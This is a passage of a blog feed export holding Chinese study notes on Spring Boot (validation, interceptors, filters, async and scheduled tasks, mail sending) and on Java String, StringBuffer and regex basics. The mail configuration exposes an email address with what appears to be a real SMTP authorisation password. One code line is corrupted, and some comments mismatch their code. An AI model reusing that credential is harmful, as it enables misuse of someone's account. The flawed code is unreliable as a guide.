</span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setUsername((String) o);</span><br><span class="line">        System.out.println(constraintValidatorContext.getDefaultConstraintMessageTemplate());</span><br><span class="line">        <span class="keyword">return</span> userMapper.select(user).size() == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/&#123;id:\\d+&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonResult <span class="title">updateById</span><span class="params">(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> UserBo userBo,<span class="meta">@PathVariable</span> String id)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    User user=<span class="keyword">new</span> User();</span><br><span class="line">    BeanUtils.copyProperties(user,userBo);</span><br><span class="line">    <span class="keyword">return</span> JsonResult.isOk(userServiceImp.updateUserById(user));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModelProperty(&quot;用户名不能为空,&quot;)</span></span><br><span class="line"><span class="meta">@Length(min = 2,max = 20,message = &quot;不能为空&quot;)</span></span><br><span class="line"><span class="meta">@UsernameIsExistsAnnotation(message = &quot;用户名不能重复&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String username;</span><br></pre></td></tr></table></figure>

<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a><strong>异常处理</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ControllerExceptionHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JsonResult <span class="title">handleRequestMethodArgumentNotValidException</span><span class="params">(MethodArgumentNotValidException e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        List&lt;ObjectError&gt; allErrors = e.getBindingResult().getAllErrors();</span><br><span class="line">        allErrors.forEach(error-&gt;&#123;</span><br><span class="line">            FieldError fieldError = (FieldError) error;</span><br><span class="line">            map.put(fieldError.getField(),fieldError.getDefaultMessage());</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResult.isErrReqParm(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="切面"><a href="#切面" class="headerlink" title="切面"></a><strong>切面</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeAspect</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log= LoggerFactory.getLogger(TimeAspect.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.example.controller.*.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">timePointCut</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;timePointCut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;TimeAspect start&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> start=System.currentTimeMillis();</span><br><span class="line">        Object proceed = pjp.proceed();</span><br><span class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">        log.info(<span class="string">&quot;TimeAspect end&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;TimeAspect cost &#123;&#125; millSec&quot;</span>,end-start);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> proceed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a><strong>拦截器</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log= LoggerFactory.getLogger(TimeInterceptor.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;TimeInterceptor start&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        httpServletRequest.setAttribute(<span class="string">&quot;start&quot;</span>,start);</span><br><span class="line">        <span class="comment">//true后面才会执行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> start= (<span class="keyword">long</span>) httpServletRequest.getAttribute(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> end=System.currentTimeMillis();</span><br><span class="line">        log.info(<span class="string">&quot;TimeInterceptor end&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;TimeInterceptor cost&#123;&#125; millSec&quot;</span>,end-start);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> TimeInterceptor());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log=LoggerFactory.getLogger(TimeFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;time filter start &quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> start=System.currentTimeMillis();</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        <span class="keyword">long</span> end=System.currentTimeMillis();</span><br><span class="line">        log.info(<span class="string">&quot;time filter end&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;time filter cost &#123;&#125; millSec &quot;</span>,end-start);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FilterRegistrationBean <span class="title">filterRegistrationBean</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FilterRegistrationBean filterRegistrationBean = <span class="keyword">new</span> FilterRegistrationBean();</span><br><span class="line"></span><br><span class="line">    filterRegistrationBean.setFilter(<span class="keyword">new</span> TimeFilter());</span><br><span class="line">    ArrayList&lt;String&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    arrayList.add(<span class="string">&quot;/user&quot;</span>);</span><br><span class="line">    filterRegistrationBean.setUrlPatterns(arrayList);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filterRegistrationBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5、任务"><a href="#5、任务" class="headerlink" title="5、任务"></a>5、任务</h1><h2 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h2><ul>
<li>在Service 中注解异步方法 <code>@Async</code></li>
<li>主配置类中开启 <code>@EnableAsync</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonResult <span class="title">asyncTest</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">   <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">   log.info(<span class="string">&quot;------ main start ------&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   Future&lt;Boolean&gt; result1 = asyncService.task1();</span><br><span class="line">   Future&lt;Boolean&gt; result2 = asyncService.task2();</span><br><span class="line">   Future&lt;Boolean&gt; result3 = asyncService.task3();</span><br><span class="line">   <span class="keyword">while</span> (!result1.isDone() || !result2.isDone() || !result3.isDone()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (result1.isDone() &amp;&amp; result2.isDone() &amp;&amp; result3.isDone()) &#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">   log.info(<span class="string">&quot;------ main end cost &#123;&#125; millSec ------&quot;</span>, end - start);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> JsonResult.isOk(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Async</span> <span class="comment">//告诉Spring这是个异步方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Future&lt;Boolean&gt; <span class="title">task1</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">   <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">   log.info(<span class="string">&quot;------ task 1 start ------&quot;</span>);</span><br><span class="line">   Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">   <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">   log.info(<span class="string">&quot;------ task 1 end cost &#123;&#125; millSec ------&quot;</span>, end - start);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> AsyncResult&lt;Boolean&gt;(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        邮件发送--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-mail --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-mail<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201221172120335.png" alt="image-20201221172120335"></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">spring.mail.username=1711938964@qq.com</span></span><br><span class="line"><span class="string">spring.mail.password=ghiecrusomoacjdb</span></span><br><span class="line"><span class="string">spring.mail.host=smtp.qq.com</span></span><br><span class="line"><span class="comment">#开启加密授权验证</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.auth=true</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.starttls.enable=true</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.starttls.required=true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(classes = Springboot2ApplicationTests.class)</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Springboot2ApplicationTests</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> JavaMailSenderImpl sender;</span><br><span class="line">    </span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">contextLoads</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		SimpleMailMessage simpleMailMessage = <span class="keyword">new</span> SimpleMailMessage();</span><br><span class="line">		simpleMailMessage.setSubject(<span class="string">&quot;标题&quot;</span>);</span><br><span class="line">		simpleMailMessage.setText(<span class="string">&quot;谢谢你&quot;</span>);</span><br><span class="line">		simpleMailMessage.setFrom(<span class="string">&quot;1711938964@qq.com&quot;</span>);</span><br><span class="line">		simpleMailMessage.setTo(<span class="string">&quot;1711938964@qq.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">		sender.send(simpleMailMessage);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableScheduling</span> <span class="comment">//开启定时任务功能 </span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cron表达式，秒 分 时  日 月 week</span></span><br><span class="line"><span class="comment">//代表每分钟 4-40执行</span></span><br><span class="line"><span class="meta">@Scheduled(cron = &quot;4-40 * * * * ？&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">task2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 每隔俩秒</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Scheduled(fixedRate = 1000)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">task1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;--- hello ----&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>工具类</title>
    <url>/2020/11/11/06%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
    <content><![CDATA[<h3 id="一、String-类"><a href="#一、String-类" class="headerlink" title="一、String 类"></a>一、String 类</h3><blockquote>
<p>字符串连接”ad”+ab–&gt;adab(<strong>字符串拼接会在堆中new出一个对象</strong>)    </p>
</blockquote>
<h4 id="1、创建方法"><a href="#1、创建方法" class="headerlink" title="1、创建方法"></a>1、创建方法</h4><h5 id="直接赋值法"><a href="#直接赋值法" class="headerlink" title="直接赋值法"></a>直接赋值法</h5><blockquote>
<p>通过这种方式创建的String对象s，指向了一个常量池中的字符串“sss”</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String s&#x3D;new String(&quot;ss&quot;); &#x2F;&#x2F;创建俩个对象</span><br></pre></td></tr></table></figure>

<h5 id="new"><a href="#new" class="headerlink" title="new"></a>new</h5><blockquote>
<p>是经过 <strong>new</strong>创建出来的对象，都会在堆内存中分配新的空间，创建新的对象，所以s是String类新创建的对象。但是也并发开辟空间</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String s&#x3D;&quot;sss&quot;;            &#x2F;&#x2F;创建一个对象</span><br></pre></td></tr></table></figure>



<blockquote>
<p>String s1=””; 字符串内容为空</p>
<p>String s2=null; 字符串对象为空</p>
</blockquote>
<h4 id="2、构造方法"><a href="#2、构造方法" class="headerlink" title="2、构造方法"></a>2、构造方法</h4><blockquote>
<p>new String(String str);将字符串转化为字符对象</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s1=<span class="keyword">new</span> String();</span><br><span class="line">String s2=<span class="keyword">new</span> String(<span class="string">&quot;s&quot;</span>);  <span class="comment">//将字符串常量转化为字符串对象</span></span><br></pre></td></tr></table></figure>



<h4 id="3、常用方法"><a href="#3、常用方法" class="headerlink" title="3、常用方法"></a>3、常用方法</h4><h5 id="1、字符串判断"><a href="#1、字符串判断" class="headerlink" title="1、字符串判断"></a>1、字符串判断</h5><p>equals()</p>
<p>equalsIgnoreCase() 忽略字符串大小写</p>
<p>contains(String str)对象是否出现在字符串中</p>
<p>isEmpty(String str) 判断是否为空</p>
<p>startsWith(String str)</p>
<p>endWith(String str)</p>
<p>str.compareTo(str1)  返回字符比较 “abc”与”bbc”–&gt;-1</p>
<h5 id="2、-字符串功能"><a href="#2、-字符串功能" class="headerlink" title="2、 字符串功能"></a>2、 字符串功能</h5><p>length() 字符串长度</p>
<p>charAt(int index)  获取指定位置的字符</p>
<p><strong>toCharArray() 将字符串转化为字符数组</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String  str=<span class="string">&quot;哈哈122abc&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">    <span class="keyword">char</span> c=str.charAt(i);</span><br><span class="line">    <span class="keyword">if</span>(c&gt;<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​       indexOf(char c):第一次出现的索引，否则返回-1</p>
<p>​       lastIndexOf(char c):最后一次出现的索引</p>
<p>​       <strong>spilt(“，”) :字符串拆分为字符串数组</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String poem=<span class="string">&quot;长亭外，古道边，芳草碧连天，晚风拂晓笛声残，夕阳山外山&quot;</span>;</span><br><span class="line">String[] poems=poem.split(<span class="string">&quot;，&quot;</span>);</span><br><span class="line">System.out.println(poems.length);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;poems.length;i++)&#123;</span><br><span class="line">    System.out.println(poems[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3、字符串截取代替"><a href="#3、字符串截取代替" class="headerlink" title="3、字符串截取代替"></a>3、字符串截取代替</h5><p>​        substring(int beginIndex ,int lastIndex): 字符串截取</p>
<p>​        replace():代替</p>
<p>​        trim():消除空格</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符串截取</span></span><br><span class="line">String ss1=<span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">System.out.println(ss1.substring(<span class="number">4</span>));</span><br><span class="line">System.out.println(ss1.substring(<span class="number">5</span>,<span class="number">9</span>));</span><br><span class="line"><span class="comment">//字符串替代</span></span><br><span class="line">System.out.println(ss1.replace(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;s&#x27;</span>));</span><br><span class="line">System.out.println(ss1.replaceAll(<span class="string">&quot;He&quot;</span>,<span class="string">&quot;ss&quot;</span>));</span><br><span class="line"><span class="comment">//trim() 消除空格</span></span><br><span class="line">String ss2=<span class="string">&quot;   hello   &quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;/&quot;</span>+ss2+<span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(ss2.trim());</span><br></pre></td></tr></table></figure>

<p>valueOf:将其他类型数值转化为字符串类型</p>
<p><strong>getBytes():将字符串编码为byte序列，存储在byte数组中</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将其他类型的数值x转换为String类型</span></span><br><span class="line">String a1=String.valueOf(<span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">System.out.println(a1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将字符串编码为byte序列，存储在byte数组中</span></span><br><span class="line">String sss1=<span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">byt0000000000000000000000000000000000000000000000e[] b1=sss1.getBytes();</span><br><span class="line">System.out.println(b1[<span class="number">0</span>]);</span><br><span class="line">System.out.println((<span class="keyword">char</span>)b1[<span class="number">0</span>]);</span><br><span class="line">String sss2=<span class="string">&quot;你好世界&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b2=sss1.getBytes();</span><br><span class="line">System.out.println(b2[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//转化为不同的字符集</span></span><br><span class="line"><span class="keyword">byte</span>[] b3=sss2.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">System.out.println(b3[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="二、StringBuffe"><a href="#二、StringBuffe" class="headerlink" title="二、StringBuffe"></a>二、StringBuffe</h3><blockquote>
<p>​        StringBuffer: 线程安全、效率低的<strong>可变字符序列</strong></p>
<p>​        StringBuilder:线程不安全，效率高的可变字符序列</p>
<p>​        String 长度固定，多次使用产生多个副本</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuilder</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(str.length() + <span class="number">16</span>);</span><br><span class="line">    append(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringBuilder</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//StringBuffer无参构造序列</span></span><br><span class="line">StringBuffer sb=<span class="keyword">new</span> StringBuffer();</span><br><span class="line">System.out.println(sb.capacity());  <span class="comment">//初始容量16</span></span><br><span class="line"></span><br><span class="line">StringBuffer sb1=<span class="keyword">new</span> StringBuffer(<span class="number">50</span>);  <span class="comment">//创建字符串缓冲区50</span></span><br><span class="line"></span><br><span class="line">StringBuffer sb2=<span class="keyword">new</span> StringBuffer(<span class="string">&quot;hELLP&quot;</span>);</span><br><span class="line">System.out.println(sb2.capacity()); <span class="comment">//21</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//append()追加 可一次性链式编程</span></span><br><span class="line">System.out.println(sb2.append(<span class="string">&quot;gg&quot;</span>));</span><br><span class="line"><span class="comment">//insert()插入</span></span><br><span class="line">System.out.println(sb2.insert(<span class="number">1</span>,<span class="string">&quot;光&quot;</span>));</span><br><span class="line"><span class="comment">//reverse()反转</span></span><br><span class="line">System.out.println(sb2.reverse());</span><br><span class="line"><span class="comment">//replace()替换</span></span><br><span class="line">System.out.println(sb2.replace(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;k&quot;</span>));</span><br><span class="line"><span class="comment">//delete()删除</span></span><br><span class="line">System.out.println(sb2.delete(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"><span class="comment">//toString默认调用，将StringBuffer转化为String</span></span><br><span class="line">System.out.println(sb2.toString());</span><br></pre></td></tr></table></figure>



<h3 id="三、正则表达式"><a href="#三、正则表达式" class="headerlink" title="三、正则表达式"></a>三、正则表达式</h3><blockquote>
<p><strong>用来检索、替换那些符合某个模式(规则)的文本。</strong></p>
</blockquote>
<blockquote>
<p>格式：[0-9]{0,9}出现 0-9的数字 0-9次</p>
</blockquote>
<ul>
<li><p>[ab]   a和b选择      [a-zA-Z]==[a-Z]  </p>
</li>
<li><p> [ ^abc ] 除了abc以外</p>
</li>
<li><p>元字符</p>
<ul>
<li>\d包含0-9，</li>
<li>\w包含a-Z,_,0-9</li>
<li>\s表示任何空白字符（\r,\f,\t）</li>
<li>   . 任何字符</li>
<li>\D 除了\d以外的所有</li>
</ul>
</li>
<li><p>+*？</p>
<ul>
<li>\d+:至少一个 </li>
<li>\d*：任意一个 </li>
<li> \d？：0或1个</li>
</ul>
</li>
<li><p>逻辑</p>
<ul>
<li>|：表示或者，01|001|1 </li>
<li>&amp;:表示且</li>
</ul>
</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200729201334450.png" alt="image-20200729201334450"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> \\d+:至少一个 ，\\d*：任意一个 ， \\d？：<span class="number">0</span>或<span class="number">1</span>个  </span><br><span class="line">     </span><br><span class="line">String regex=<span class="string">&quot;[0-9][0-9][0-9][0-9][0-9][0-9]&quot;</span>;</span><br><span class="line">String regex=<span class="string">&quot;\\d\\d\\d\\d\\d\\d&quot;</span>;</span><br><span class="line">String regex=<span class="string">&quot;\\d&#123;6&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line">String regex=<span class="string">&quot;\\d&#123;3,6&#125;&quot;</span>;  </span><br><span class="line">String regex=<span class="string">&quot;\\d&#123;3,&#125;&quot;</span>;   </span><br><span class="line"> </span><br><span class="line">String str3=<span class="string">&quot;www.baidu6.com&quot;</span>;</span><br><span class="line">String regex4=<span class="string">&quot;www\\.\\w&#123;6&#125;\\.com&quot;</span>;</span><br><span class="line">System.out.println(str3.matches(regex4));</span><br><span class="line"></span><br><span class="line"><span class="keyword">boolean</span> b=postcode.matches(regex);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200729201941398.png" alt="image-20200729201941398"></p>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200729201949365.png" alt="image-20200729201949365"></p>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200729201956335.png" alt="image-20200729201956335"></p>
<p>1、验证:通过字符串matches(regex)方法进行验证</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> b=postcode.matches(regex);</span><br></pre></td></tr></table></figure>

<p>2、分割：通过字符串split(regex)方法进行分隔</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] poems=poem.split(<span class="string">&quot;\\w+&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>3、替换 String类的replaceAll(regex,”A”)方法这</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">s2.replaceAll(regex6,<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>

